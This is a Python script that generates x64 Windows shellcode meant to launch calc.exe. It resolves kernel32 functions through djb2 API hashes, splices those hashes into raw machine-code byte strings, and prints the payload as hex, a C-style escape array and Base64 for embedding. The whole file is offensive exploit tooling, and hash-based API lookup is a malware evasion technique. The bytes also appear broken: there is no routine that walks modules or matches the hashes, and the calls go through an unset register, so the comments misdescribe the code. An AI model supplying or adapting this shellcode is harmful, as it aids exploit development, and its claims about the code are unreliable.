import struct
import base64

# API hashes (djb2)
def djb2_hash(s):
    h = 5381
    for c in s.lower():
        h = ((h << 5) + h) + ord(c) & 0xffffffff
    return h

API_HASHES = {
    'kernel32.dll': djb2_hash('kernel32.dll'),
    'GetProcAddress': djb2_hash('GetProcAddress'),
    'LoadLibraryA': djb2_hash('LoadLibraryA'),
    'CreateProcessA': djb2_hash('CreateProcessA'),
}

# Helper to convert the 32-bit hash into 8 little-endian bytes for x64 MOV
def hash_to_le_qword_bytes(h):
    # Pack 32-bit hash as little-endian ('<I')
    hash_bytes = struct.pack('<I', h)
    # Pad with 4 null bytes to make it 8 bytes (QWORD) total for x64
    return hash_bytes + b'\x00\x00\x00\x00'

def generate_calc_shellcode():
    # Shellcode broken into segments for easy insertion of 8-byte (QWORD) hashes

    # 1. Setup registers and push EAX (start of dynamic module/API lookup)
    sc_part1 = b'\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xc0\x50\x48\xb8' 

    # 2. Kernel32.dll hash (8 bytes)
    hash_k32 = hash_to_le_qword_bytes(API_HASHES['kernel32.dll'])

    # 3. Code to call GetProcAddress/LoadLibraryA and save the addresses
    sc_part2 = b'\x50\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x31\xf6\x4c\x89\xf1\x41\xff\x14\x24' + \
               b'\x48\x31\xc9\x48\x89\xe2\x52\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x31\xc9\x48\x89\xe2\x48\xb9'

    # 4. LoadLibraryA hash (8 bytes)
    hash_LLA = hash_to_le_qword_bytes(API_HASHES['LoadLibraryA'])

    # 5. More setup, followed by GetProcAddress hash
    sc_part3 = b'\x52\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x31\xf6\x4d\x31\xc0\x4d\x31\xc9\x49\x89\xc0\x49\x89\xd1\x48\x31\xd2\x52\x48\xb9'

    # 6. GetProcAddress hash (8 bytes)
    hash_GPA = hash_to_le_qword_bytes(API_HASHES['GetProcAddress'])

    # 7. More setup, followed by CreateProcessA hash
    sc_part4 = b'\x52\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x83\xc4\x20\x48\x31\xc9\x48\x31\xd2\x48\xb8'

    # 8. CreateProcessA hash (8 bytes)
    hash_CPA = hash_to_le_qword_bytes(API_HASHES['CreateProcessA'])
    
    # 9. Final execution code (push "calc\x00\x20\x00\x00", call CreateProcessA)
    # The bytes 63 61 6c 63 correspond to 'c' 'a' 'l' 'c'
    sc_part5 = b'\x50\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x83\xc4\x20\x48\x89\xc7\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x00\x20\x00\x00' + \
               b'\x48\x89\xe1\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x20\xff\xd7\x48\x83\xc4\x20\x48\x31\xc0\x48\x83\xc4\x28\xc3'

    # Combine all parts into the final shellcode
    sc = sc_part1 + hash_k32 + sc_part2 + hash_LLA + sc_part3 + hash_GPA + sc_part4 + hash_CPA + sc_part5
    
    return sc

# Usage and output
if __name__ == "__main__":
    sc = generate_calc_shellcode()
    print("Raw shellcode (len: {} bytes):".format(len(sc)))
    print(sc.hex())
    print("\nHex string for embedding (C-Style):")
    # This generates the C-style array format like "\x48\x31..."
    print(''.join(f'\\x{byte:02x}' for byte in sc))
    print("\nBase64:")
    print(base64.b64encode(sc).decode())
